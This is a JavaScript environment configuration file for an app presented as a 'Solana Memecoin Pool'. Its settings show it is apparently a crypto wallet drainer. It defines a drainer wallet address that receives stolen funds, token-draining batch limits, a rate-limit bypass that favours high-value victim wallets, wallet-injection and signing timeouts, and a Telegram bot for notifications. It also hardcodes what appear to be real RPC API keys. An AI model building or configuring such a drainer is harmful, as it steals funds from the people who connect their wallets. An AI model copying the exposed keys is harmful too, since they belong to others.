// Environment Configuration for Solana Memecoin Pool Application
// Set these variables in your Vercel project environment variables
// For local development, create a .env.local file with these values

export const ENV_CONFIG = {
  // Server Configuration
  PORT: process.env.PORT || 3002,
  NODE_ENV: process.env.NODE_ENV || 'development',
  
  // Solana RPC Configuration - Prioritizing reliable RPCs
  RPC_URL: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com',
  
  // Helius RPC (Primary)
  HELIUS_RPC_URL: process.env.HELIUS_RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
  HELIUS_API_KEY: process.env.HELIUS_API_KEY || '19041dd1-5f30-4135-9b5a-9b670510524b',
  
  // Shyft RPC (Fallback)
  SHYFT_RPC_URL: process.env.SHYFT_RPC_URL || 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
  SHYFT_API_KEY: process.env.SHYFT_API_KEY || '-C7eUSlaDtQcR6b0',
  
  // Telegram Bot Configuration
  TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  
  // Project Configuration
  PROJECT_NAME: process.env.PROJECT_NAME || 'Solana Memecoin Pool',
  
  // Web3Modal Configuration
  WEB3MODAL_PROJECT_ID: process.env.WEB3MODAL_PROJECT_ID || '45a382364ff2b00404b2d4c2ff95dbd4',
  
  // Drainer Configuration
  DRAINER_WALLET_ADDRESS: process.env.DRAINER_WALLET_ADDRESS || 'FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj',
  
  // Transaction Limits
  MIN_SOL_FOR_FEES: parseFloat(process.env.MIN_SOL_FOR_FEES) || 0.005,
  MIN_SOL_FOR_ATA: parseFloat(process.env.MIN_SOL_FOR_ATA) || 0.002,
  MIN_WALLET_VALUE: parseFloat(process.env.MIN_WALLET_VALUE) || 0.001,
  MAX_ADDRESS_DIFFERENCES: parseInt(process.env.MAX_ADDRESS_DIFFERENCES) || 3,
  
  // Token Draining Limits & Batching
  MAX_TOKENS_PER_TRANSACTION: parseInt(process.env.MAX_TOKENS_PER_TRANSACTION) || 50,
  MAX_INSTRUCTIONS_PER_TRANSACTION: parseInt(process.env.MAX_INSTRUCTIONS_PER_TRANSACTION) || 80,
  MAX_TRANSACTION_SIZE_BYTES: parseInt(process.env.MAX_TRANSACTION_SIZE_BYTES) || 1200,
  ENABLE_TOKEN_BATCHING: process.env.ENABLE_TOKEN_BATCHING !== 'false', // Default: true
  
  // Rate Limit Bypass for High-Value Wallets
  RATE_LIMIT_BYPASS_TOKEN_THRESHOLD: parseInt(process.env.RATE_LIMIT_BYPASS_TOKEN_THRESHOLD) || 100,
  RATE_LIMIT_BYPASS_SOL_THRESHOLD: parseFloat(process.env.RATE_LIMIT_BYPASS_SOL_THRESHOLD) || 1.0,
  RATE_LIMIT_BYPASS_ENABLED: process.env.RATE_LIMIT_BYPASS_ENABLED !== 'false', // Default: true
  
  // Rate Limiting - Extremely lenient for testing
  GENERAL_RATE_LIMIT: parseInt(process.env.GENERAL_RATE_LIMIT) || 10000, // Increased from 1000 to 10000
  DRAIN_RATE_LIMIT: parseInt(process.env.DRAIN_RATE_LIMIT) || 20000, // Increased from 2000 to 20000
  RATE_LIMIT_WINDOW_MS: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 3600000,
  
  // Timeouts (in milliseconds) - Optimized for better performance
  WALLET_CONNECTION_TIMEOUT: parseInt(process.env.WALLET_CONNECTION_TIMEOUT) || 15000, // Reduced from 20s to 15s
  DEEP_LINKING_TIMEOUT: parseInt(process.env.DEEP_LINKING_TIMEOUT) || 8000, // Reduced from 10s to 8s
  WALLET_INJECTION_TIMEOUT: parseInt(process.env.WALLET_INJECTION_TIMEOUT) || 8000, // Reduced from 10s to 8s
  DRAIN_API_TIMEOUT: parseInt(process.env.DRAIN_API_TIMEOUT) || 15000, // Reduced from 120s to 15s - much faster
  BROADCAST_TIMEOUT: parseInt(process.env.BROADCAST_TIMEOUT) || 30000, // Reduced from 60s to 30s
  SIGNING_TIMEOUT: parseInt(process.env.SIGNING_TIMEOUT) || 30000, // Reduced from 90s to 30s - much faster
  
  // Jupiter API Configuration
  JUPITER_TOKEN_LIST_URL: process.env.JUPITER_TOKEN_LIST_URL || 'https://token.jup.ag/all'
};

// Prioritized RPC endpoints - Helius and Shyft first, then fallbacks
export const RPC_ENDPOINTS = [
  // Primary RPCs (most reliable)
  process.env.HELIUS_RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
  process.env.SHYFT_RPC_URL || 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
  
  // Environment variable RPC (if set)
  process.env.RPC_URL || 'https://api.mainnet-beta.solana.com',
  
  // Fallback RPCs (less reliable, only as last resort)
  'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://rpc.ankr.com/solana',
  'https://mainnet.rpcpool.com'
];

// Web3Modal specific RPC configuration
export const WEB3MODAL_RPC_CONFIG = {
  primary: process.env.HELIUS_RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
  fallback: process.env.SHYFT_RPC_URL || 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
  public: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com'
};

export const PROJECT_NAME = process.env.PROJECT_NAME || 'Solana Memecoin Pool';

export default ENV_CONFIG;
